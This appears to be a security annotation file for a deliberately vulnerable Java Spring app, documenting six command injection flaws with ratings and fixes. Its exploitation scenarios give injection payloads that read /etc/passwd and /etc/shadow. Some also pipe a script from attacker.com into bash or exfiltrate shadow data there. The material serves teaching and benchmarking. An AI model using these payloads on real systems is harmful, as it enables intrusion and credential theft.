# Security Companion Document: App.java

## Vulnerability: Direct Command Injection via Runtime.exec in Ping

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L29  

### Description
The `pingHost` method constructs a shell command by directly concatenating the user-supplied `host` request parameter into a string passed to `Runtime.getRuntime().exec()`. The `host` value from `@RequestParam` is appended to the command string without any sanitization or validation.

### Exploitation Scenario
An attacker sends `GET /api/ping?host=127.0.0.1;cat /etc/passwd`. When `Runtime.exec()` receives a single string argument, it delegates to the system shell for parsing. The semicolon terminates the `ping` command and executes `cat /etc/passwd`, returning sensitive system file contents.

### Remediation Guidance
Use `ProcessBuilder` with an explicit argument list to avoid shell interpretation:
```java
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", host);
Process proc = pb.start();
```
Additionally, validate the `host` parameter against a hostname/IP regex pattern.

### Complexity Rationale
This is rated Obvious because user input flows directly from the request parameter into `Runtime.exec()` with string concatenation, a textbook command injection pattern with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `Runtime.exec()` with string concatenation is a well-known dangerous pattern that all major Java SAST tools (SpotBugs, PMD, Semgrep) flag reliably.

---

## Vulnerability: Shell Command Injection via Runtime.exec in DNS Lookup Helper

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L53  

### Description
The `executeDig` private helper method constructs a shell command array where the third element is built by concatenating the `domain` parameter into a `dig` command string. Although the method receives a validated `recordType`, the `domain` parameter passed from `dnsLookup` is taken directly from the request without sanitization. The command is executed via `Runtime.getRuntime().exec(String[])` with `/bin/sh -c` as the shell interpreter.

### Exploitation Scenario
An attacker sends `GET /api/dns/lookup?domain=example.com;id`. The `domain` value is interpolated into the shell command as `dig A example.com;id +short`, causing the shell to execute both `dig` and `id`. The attacker can chain arbitrary commands to achieve remote code execution.

### Remediation Guidance
Use `ProcessBuilder` with separate arguments:
```java
ProcessBuilder pb = new ProcessBuilder("dig", recordType, domain, "+short");
Process proc = pb.start();
```

### Complexity Rationale
This is rated Moderate because the vulnerability is in a private helper method called from the route handler. The `recordType` parameter is validated against an allowlist in the caller, which may create a false sense of security. A reviewer must trace the data flow to see that `domain` bypasses validation.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need interprocedural analysis to track the taint from `@RequestParam` through `dnsLookup` into `executeDig`. The use of a `String[]` array with `/bin/sh -c` is less commonly flagged than single-string `exec()`.

---

## Vulnerability: Multi-Parameter Command Injection in Log Search

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L70  

### Description
The `searchLogs` method constructs a shell pipeline command using `String.format()` that embeds three user-controlled parameters: `lines`, `logPath` (derived from the `file` parameter), and `keyword`. All three are interpolated into a `tail | grep` pipeline and executed via `ProcessBuilder` with `/bin/sh -c`. The `keyword` is wrapped in single quotes, but this provides no real protection since an attacker can break out of the quotes.

### Exploitation Scenario
An attacker sends `GET /api/logs/search?keyword=error'%3B%20id%20%23&file=syslog&lines=100`. The single quote breaks out of the grep pattern, the semicolon starts a new command, and `#` comments out the rest. Alternatively, the `lines` parameter can inject commands: `GET /api/logs/search?keyword=test&lines=100;cat /etc/shadow%23`.

### Remediation Guidance
Avoid shell pipelines. Use `ProcessBuilder` with separate commands:
```java
ProcessBuilder tailPb = new ProcessBuilder("tail", "-n", lines, logPath);
Process tailProc = tailPb.start();
ProcessBuilder grepPb = new ProcessBuilder("grep", keyword);
grepPb.redirectInput(tailProc.getInputStream());
```

### Complexity Rationale
This is rated Nuanced because three separate user-controlled parameters are injected into a single shell pipeline, and the single-quote wrapping around the keyword creates a false appearance of sanitization. A reviewer must recognize that all three parameters are attack vectors and that the quoting is insufficient.

### Detection Difficulty Rationale
This is rated Likely_Missed because the multiple injection points within a shell pipeline, combined with the pseudo-sanitization of single quotes, make this difficult for SAST tools to fully analyze. Tools may flag the `ProcessBuilder` with shell usage but miss the specific multi-parameter injection vectors.

---

## Vulnerability: Command Injection via Shell Execution in Archive

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L109  

### Description
The `archiveFiles` method constructs a shell command using `String.format()` to embed the `filePath` from the request body into a `tar` command, then executes it via `ProcessBuilder` with `/bin/sh -c`. While the `archiveName` undergoes basic sanitization (replacing `/` and `\` with `_`), the `filePath` parameter is embedded directly without any validation.

### Exploitation Scenario
An attacker sends `POST /api/files/archive` with body `{"path": "/tmp/data; curl attacker.com/shell.sh | bash", "name": "backup"}`. The `filePath` value is interpolated into the `tar` command, and the shell executes the injected commands, achieving remote code execution.

### Remediation Guidance
Use `ProcessBuilder` with argument lists:
```java
ProcessBuilder pb = new ProcessBuilder("tar", "czf", archivePath, filePath);
Process proc = pb.start();
```

### Complexity Rationale
This is rated Moderate because the vulnerability is partially obscured by the sanitization applied to the adjacent `archiveName` parameter. A reviewer must recognize that `filePath` bypasses the sanitization and is directly embedded in the shell command.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because the taint flows from `@RequestBody` through a `Map` extraction into `String.format()` and then to `ProcessBuilder` with shell execution. Tools need to track JSON body parameters through map operations.

---

## Vulnerability: Command Injection via Shell Execution in Port Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L143  

### Description
The `checkPort` method constructs a shell command using `String.format()` to embed the `host` parameter into a `nc` (netcat) command, then executes it via `ProcessBuilder` with `/bin/sh -c`. While the `port` parameter undergoes integer parsing and range validation, the `host` parameter from the request body is embedded directly without sanitization.

### Exploitation Scenario
An attacker sends `POST /api/network/check` with body `{"host": "127.0.0.1; whoami", "port": 80}`. The `host` value is interpolated into the `nc` command, and the shell executes both `nc` and `whoami`. The attacker can chain arbitrary commands for remote code execution.

### Remediation Guidance
Use `ProcessBuilder` with argument lists:
```java
ProcessBuilder pb = new ProcessBuilder("nc", "-zv", "-w", "3", host, String.valueOf(port));
Process proc = pb.start();
```

### Complexity Rationale
This is rated Moderate because the adjacent `port` parameter has proper integer validation, which may create a false sense of security. However, the `host` parameter is directly embedded without validation.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from request body to `ProcessBuilder` with `/bin/sh -c` and `String.format()` is a standard pattern that SAST tools detect reliably.

---

## Vulnerability: Command Injection via Shell Execution in Certificate Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L168-L170  

### Description
The `checkCert` method constructs a complex shell pipeline using `String.format()` that embeds the `hostname` parameter three times into an `openssl` command chain. The command pipes through `echo`, `openssl s_client`, and `openssl x509` with shell redirections. The `hostname` from `@RequestParam` is interpolated without sanitization into multiple positions within the pipeline.

### Exploitation Scenario
An attacker sends `GET /api/certs/check?hostname=example.com;curl attacker.com/exfil?data=$(cat /etc/shadow)`. The injected command is executed by the shell, exfiltrating sensitive data. The triple interpolation of `hostname` in the command string provides multiple injection points.

### Remediation Guidance
Validate the hostname against a strict pattern and avoid shell pipelines:
```java
if (!hostname.matches("[a-zA-Z0-9.-]+")) {
    return ResponseEntity.badRequest().body(Map.of("error", "Invalid hostname"));
}
```
Or use a Java SSL library to check certificates programmatically instead of shelling out to `openssl`.

### Complexity Rationale
This is rated Nuanced because the vulnerability is embedded within a complex multi-stage shell pipeline with redirections and multiple interpolation points. The `openssl` command chain appears to be a legitimate system administration operation, and the triple use of the hostname parameter is unusual.

### Detection Difficulty Rationale
This is rated Likely_Missed because the complex shell pipeline with multiple pipes, redirections, and `/dev/null` references makes it difficult for SAST tools to parse and analyze. The `hostname` parameter appears in three positions, and tools may not track taint through complex shell command strings.
